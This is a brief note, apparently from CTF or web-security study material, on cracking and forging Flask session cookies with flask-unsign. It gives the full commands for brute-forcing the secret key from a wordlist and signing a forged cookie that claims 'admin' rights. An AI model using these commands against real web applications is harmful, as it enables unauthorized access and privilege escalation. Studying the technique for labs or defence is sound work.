# Flask sign and unsign:
> When we have cookies in this format: eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZrSfTg.JIe9B0Hm3mgltvuM6n456DsXNm0
> And we check the source code and realise that flask is being used for the cookies, we sould look for a list of values that might be used in creating the cookie.
> If we find that list, we save each value in one new line and save them in a file.
> 
> Then we can take the cookie from our requests, and unsign it with the file, in order to get the corresponding value.
> Command: ```flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZrSezw.laAVJNwlqjzqr5USP0FvXuyEUOY --wordlist cookies.txt```
> Where:
> --cookie is the cookie from requests
> --wordlist is the file saved with each value from flask cookie list found in source code
>
> Then we sign again with the correct value, and the resulted cookie is taken and replaced in our request in order to provide the correct cookie.
> Command: ```flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'```
